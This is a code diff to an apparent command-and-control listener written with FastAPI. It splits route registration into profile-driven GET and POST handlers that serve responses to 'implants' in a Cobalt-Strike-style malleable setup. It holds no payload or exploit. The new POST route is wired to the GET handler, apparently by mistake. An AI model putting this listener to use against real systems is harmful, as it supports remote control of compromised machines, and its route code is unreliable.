@@ -38,8 +38,13 @@ def run(listener_uuid: str):
         version="0.0.0",
     )
 
-    # dont register until mp is created.
-    register_routes()
+    # setup get route
+    http_get_method = getattr(mp.http_get.verb, "value", "GET")
+    register_http_get_route(method=http_get_method, uri=URL(mp.http_get.uri.value))
+
+    # setup post route
+    http_post_method = getattr(mp.http_post.verb, "value", "POST")
+    register_http_post_route(method=http_post_method, uri=URL(mp.http_post.uri.value))
 
     # reload needs to be OFF.
     uvicorn.run(app, host="0.0.0.0", port=8000, reload=False)
@@ -54,9 +59,29 @@ HTTP POST with CS is where task data is retrieved from the server.
 """
 
 
-async def http_get():
-    # placehodler  script locatiob
+async def http_get(request: Request, **kwargs):
+    """
+    HTTP GET endpoint for the HTTP listener.
 
+    Note:
+    - Accepts all URL parameters via **kwargs.
+    - OpenAPI parameter documentation is not generated due to the **kwargs
+    - This design enables a more flexible and malleable C2 interface.
+    """
+    print(request)
+    # maybe kwargs handling if needed (metadata, etc.)
+    print(kwargs)
+
+    """
+    Handle inputted data form fastapi
+
+    """
+    # placehodler  script location
+
+    """
+    Setup a response for the implant
+
+    """
     # pass in block to respective class
     emitter = HttpServerEmitter(mp.http_get.server)
 
@@ -135,23 +160,34 @@ async def http_post():
     return Response(content=body, headers=headers)
 
 
-def register_routes():
+def register_http_get_route(
+    uri: URL,
+    method: str,
+):
     """
     Registeres routes. Prevents these being called on import as well.
     """
     app.add_api_route(
-        path=str(URL(mp.http_get.uri.value)),
+        path=str(URL(uri)),
         endpoint=http_get,  # logic for endpoint here
-        methods=["GET"],
-        response_model=dict,
-        tags=["items"],
+        methods=[method],
+        # response_model=dict,
+        # tags=["items"],
     )
 
+
+def register_http_post_route(
+    uri: URL,
+    method: str,
+):
+    """
+    Registeres routes. Prevents these being called on import as well.
+    """
     # HTTP POST ROUTE
     app.add_api_route(
-        path=str(URL(mp.http_post.uri.value)),
-        endpoint=http_post,  # logic for endpoint here
-        methods=["GET"],
-        response_model=dict,
-        tags=["items"],
+        path=str(URL(uri)),
+        endpoint=http_get,  # logic for endpoint here
+        methods=[method],
+        # response_model=dict,
+        # tags=["items"],
     )
